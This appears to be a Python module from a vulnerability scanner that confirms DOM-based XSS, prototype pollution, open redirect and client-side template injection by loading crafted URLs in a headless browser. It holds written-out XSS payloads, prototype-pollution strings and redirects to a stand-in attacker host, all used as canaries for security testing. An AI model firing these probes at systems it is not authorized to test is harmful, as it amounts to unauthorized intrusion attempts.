"""
DOM audit — dynamic client-side source->sink confirmation (a mini DOM-Invader).

The static js_review flags dangerous sinks (innerHTML, location, __proto__, deparam,
AngularJS) as LEADS. This module turns the confirmable ones into CONFIRMED findings
by driving a real headless browser: inject a unique marker into a DOM SOURCE
(location.hash / a query param), load the page, and observe whether a SINK actually
fired — proof, not suspicion. Four classes are confirmable with no false positives
because each check keys on a unique canary that cannot occur naturally:

  - Prototype pollution: `?__proto__[KEY]=VAL` (or via the hash) => after load,
    Object.prototype[KEY] === VAL globally.
  - DOM-based XSS: an auto-firing payload in the hash/param => alert() fires with
    our marker (execution, not mere reflection).
  - DOM-based open redirect: a URL source pointed at an attacker host => the page
    navigates to that host.
  - Client-side template injection: `{{7*7}}MARKER` in a reflected param => the DOM
    renders `49MARKER` (the expression evaluated), only where a template engine runs.

Pure/deterministic here (probe URLs + result interpretation + finding builders); the
browser transport lives in tools._run_dom_audit.
"""
from __future__ import annotations

from urllib.parse import urlparse, urlunparse, parse_qsl, urlencode

MARK = "bbhdom8842"          # unique canary (execution / render marker)
PP_KEY = "bbhpp8842"         # prototype-pollution property name (must be unique)
EVIL = "bbh-evil.example"    # attacker host for open-redirect confirmation

EXEC_PAYLOADS = (
    f'<img src=x onerror=alert("{MARK}")>',
    f'<svg onload=alert("{MARK}")>',
)
# Query params that commonly feed a client-side redirect or a template.
REDIRECT_PARAMS = ("returnUrl", "redirect", "url", "next", "return", "dest", "redir", "goto")
TEMPLATE_PARAMS = ("search", "q", "query", "searchTerm", "message", "name", "s")


def _set_fragment(url: str, value: str) -> str:
    return urlunparse(urlparse(url)._replace(fragment=value))


def _add_query(url: str, name: str, value: str) -> str:
    p = urlparse(url)
    pairs = [(k, v) for k, v in parse_qsl(p.query, keep_blank_values=True) if k != name]
    pairs.append((name, value))
    return urlunparse(p._replace(query=urlencode(pairs)))


def build_probes(url: str) -> list:
    """Bounded set of DOM probes for one page. Each item:
    {"class", "nav" (URL to load), "src" (source), "expect"}."""
    probes = []
    # the page's OWN query params — the reflected ones most likely to reach a template or
    # a client-side redirect sink (e.g. /catalog?category, /blog?search). Testing these —
    # not just a fixed name list — is what catches CSTI on app-specific params like category.
    own_params = [k for k, _ in parse_qsl(urlparse(url).query, keep_blank_values=True) if k]
    csti_params = list(dict.fromkeys(own_params + list(TEMPLATE_PARAMS)))
    redir_params = list(dict.fromkeys(own_params + list(REDIRECT_PARAMS)))
    # ── CSTI first (highest value): reflected template expression into own + common params ──
    for pn in csti_params:
        probes.append({"class": "csti", "nav": _add_query(url, pn, "{{7*7}}" + MARK), "src": pn})
    # ── prototype pollution: hash (deparam/hash routers) + query ──
    for src, nav in (("hash", _set_fragment(url, f"__proto__[{PP_KEY}]={MARK}")),
                     ("query", _add_query(url, f"__proto__[{PP_KEY}]", MARK)),
                     ("hash", _set_fragment(url, f"constructor[prototype][{PP_KEY}]={MARK}"))):
        probes.append({"class": "proto", "nav": nav, "src": src})
    # ── DOM open redirect: hash + redirect-ish + own params ──
    probes.append({"class": "redirect", "nav": _set_fragment(url, f"https://{EVIL}/"), "src": "hash"})
    for pn in redir_params:
        probes.append({"class": "redirect", "nav": _add_query(url, pn, f"https://{EVIL}/"), "src": pn})
    # ── DOM XSS: hash execution (covers hashchange/render sinks) ──
    for pl in EXEC_PAYLOADS:
        probes.append({"class": "xss", "nav": _set_fragment(url, pl), "src": "hash"})
    # de-dup by nav URL, keep order (CSTI-on-own-params prioritised), cap for a bounded pass
    seen, out = set(), []
    for p in probes:
        if p["nav"] not in seen:
            seen.add(p["nav"])
            out.append(p)
    return out[:24]


# ── interpret one probe's browser result ─────────────────────────
def confirmed_proto(pp_value) -> bool:
    return pp_value == MARK


def confirmed_redirect(nav_targets) -> bool:
    # A real DOM open redirect NAVIGATES the top document to a URL whose HOST is
    # the attacker host. A substring test on the raw nav URL is wrong and yields a
    # false positive: our probe URL carries EVIL in its own fragment/query
    # (e.g. http://target/#https://bbh-evil.example/), so the initial same-origin
    # load — reported by page.on("framenavigated") — trivially "contains" EVIL even
    # though the browser never left the target. Compare the parsed HOST instead, so
    # only a genuine navigation whose host IS the attacker host confirms.
    for t in (nav_targets or []):
        try:
            host = (urlparse((t or "").strip()).hostname or "").lower()
        except ValueError:
            continue
        if host == EVIL or host.endswith("." + EVIL):
            return True
    return False


def confirmed_xss(dialog_msg) -> bool:
    return bool(dialog_msg) and MARK in str(dialog_msg)


def confirmed_csti(body: str) -> bool:
    # {{7*7}} rendered to 49 with the marker intact => the engine evaluated it.
    return bool(body) and (f"49{MARK}" in body) and (f"{{{{7*7}}}}{MARK}" not in body)


# per-family CVSS v3.1 base (defensible vectors) + the browser oracle each class confirms on.
_DOM_CVSS = {
    "xss":                 ("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", 6.1),
    "csti":                ("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", 6.1),
    "prototype_pollution": ("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L", 4.6),
    "open_redirect":       ("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N", 4.7),
}


# ── finding builders (all CONFIRMED, with evidence) ──────────────
def _base(url, title, sev, desc, evidence, family, cwe, tags, steps, impact=None, oracle=None):
    vec, score = _DOM_CVSS.get(family, ("", None))
    return {"title": title, "severity": sev, "target": url, "description": desc,
            "impact": impact or "Client-side code execution / manipulation in victims' browsers.",
            "evidence": evidence, "reproduction_steps": steps, "cwe": cwe, "family": family,
            "tags": tags, "confidence": "confirmed",
            "cvss_vector": vec, "cvss_score": score,
            "success_oracle": oracle or "a unique browser canary fired at runtime (see Evidence)"}


def proto_finding(url, nav, src):
    return _base(url, f"Client-side prototype pollution (DOM, via {src})", "high",
                 (f"Injecting a property through the {src} polluted Object.prototype globally "
                  "(a client-side prototype-pollution gadget processed attacker input)."),
                 f"Loaded {nav} → Object.prototype.{PP_KEY} === \"{MARK}\" after load.",
                 "prototype_pollution", "CWE-1321", ["prototype-pollution", "dom"],
                 [f"Load {nav}", f"In the console, read Object.prototype.{PP_KEY}",
                  "Observe the attacker-controlled value is now global (pollution confirmed)"],
                 impact=("A client-side prototype-pollution gadget lets attacker input set properties on "
                         "Object.prototype for every object in the victim's page, which can corrupt app logic "
                         "and, where a downstream sink trusts a polluted property, escalate to DOM XSS. Impact is "
                         "client-side (victim browser), not server compromise."),
                 oracle=f"after loading the crafted URL, Object.prototype.{PP_KEY} === the unique marker \"{MARK}\"")


def redirect_finding(url, nav, src):
    return _base(url, f"DOM-based open redirection (via {src})", "medium",
                 (f"A URL taken from the {src} is used to navigate the browser without validation, so "
                  "the page can be made to send visitors to an attacker-chosen site."),
                 f"Loaded {nav} → the page navigated to https://{EVIL}/.",
                 "open_redirect", "CWE-601", ["open-redirect", "dom"],
                 [f"Load {nav}", f"Observe the browser navigate to https://{EVIL}/"],
                 impact=("An attacker-chosen URL in the %s drives the browser to an external site, enabling "
                         "convincing phishing and OAuth/token-forwarding abuse from the trusted origin." % src),
                 oracle=f"the page issues a top-level navigation to the attacker-controlled host {EVIL}")


def xss_finding(url, nav, src):
    return _base(url, f"DOM-based XSS (via {src})", "high",
                 (f"A payload delivered through the {src} reached a DOM sink and EXECUTED in a real "
                  "browser (alert fired) — attacker script runs in the victim's session."),
                 f"Loaded {nav} → alert(\"{MARK}\") executed.",
                 "xss", "CWE-79", ["xss", "dom"],
                 [f"Load {nav}", "Observe alert() fire (script executed from the DOM source)"],
                 impact=("Attacker JavaScript runs in the victim's authenticated session from the trusted origin: "
                         "session/cookie theft, account actions as the victim, keylogging, and phishing. Client-side, "
                         "not server compromise."),
                 oracle=f"alert() executed in a real browser carrying the unique marker \"{MARK}\"")


def csti_finding(url, nav, src):
    f = _base(url, f"Client-side template injection (CSTI, via {src})", "high",
              (f"Input in '{src}' is evaluated by the page's CLIENT-SIDE template engine (AngularJS) in the "
               "victim's browser: the expression {{7*7}} rendered as 49. This is client-side code execution "
               "(an AngularJS sandbox escape to JavaScript) — NOT server-side template injection, and it does "
               "NOT give server RCE or server compromise."),
              (f"Headless Chromium loaded {nav}; after the AngularJS digest the rendered DOM contained "
               f"\"49{MARK}\" — the expression 7*7 was evaluated in-browser (browser-confirmed, not reflection)."),
              "csti", "CWE-79", ["csti", "dom-xss", "client-side"],
              [f"Open {nav} in a browser running the AngularJS app",
               "Let the AngularJS digest cycle run",
               "Observe 49 rendered in place of {{7*7}} in the live DOM — the expression executed client-side"])
    f["capec"] = "CAPEC-588: DOM-Based Cross-Site Scripting"
    f["success_oracle"] = (f"after the AngularJS digest, the live DOM contains \"49{MARK}\" (the expression "
                           "7*7 evaluated in-browser) while the literal {{7*7}} does not remain")
    f["impact"] = ("Attacker-controlled AngularJS expressions execute as JavaScript in the victim's browser "
                   "(client-side code execution / DOM XSS). Realistic impact: session-cookie theft, account "
                   "takeover, keylogging of form input, and convincing phishing served from the trusted domain. "
                   "This does not compromise the server itself.")
    return f


def build_finding(probe: dict, *, pp_value=None, nav_targets=None, dialog_msg=None, body=None):
    """Return a CONFIRMED finding for a probe whose browser result proves the class,
    else None. One place so the transport never has to guess."""
    cls, url, nav, src = probe["class"], probe.get("base", probe["nav"]), probe["nav"], probe["src"]
    if cls == "proto" and confirmed_proto(pp_value):
        return proto_finding(url, nav, src)
    if cls == "redirect" and confirmed_redirect(nav_targets):
        return redirect_finding(url, nav, src)
    if cls == "xss" and confirmed_xss(dialog_msg):
        return xss_finding(url, nav, src)
    if cls == "csti" and confirmed_csti(body):
        return csti_finding(url, nav, src)
    return None
